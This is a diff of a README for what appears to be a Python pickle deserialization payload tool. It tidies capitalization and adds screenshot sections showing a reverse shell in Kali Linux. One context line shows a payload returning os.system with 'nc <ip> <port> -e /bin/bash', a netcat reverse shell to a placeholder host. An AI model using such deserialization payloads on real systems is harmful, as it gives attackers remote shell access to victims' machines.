@@ -49,7 +49,7 @@ The default payload executes the `whoami` command. To change the command:
    return (os.system, ("nc <ip> <port> -e /bin/bash",))
    ```
 
-## Example of use via terminal in kali linux (in this case, without venv):
+## Example of use via terminal in Kali Linux (in this case, without venv):
 
 <div align="center">
   <img src="https://github.com/user-attachments/assets/fda334c0-a684-496f-8185-c6ea203e89fc">
@@ -59,6 +59,16 @@ The default payload executes the `whoami` command. To change the command:
 
 <div align="center">
   <img src="https://github.com/user-attachments/assets/3a453f5d-11c9-42d5-b724-83ab5154dac2">
+</div>
+
+## Example of reverse shell in Kali Linux:
+
+<div align="center">
+  <img src="https://github.com/user-attachments/assets/8385e349-d221-4a99-856b-12fb09d2cf67">
+</div>
+
+<div align="center">
+  <img src="https://github.com/user-attachments/assets/df18da93-c6ba-4737-a257-596d1f9abf6b">
 </div>
 
 ## **Warnings**
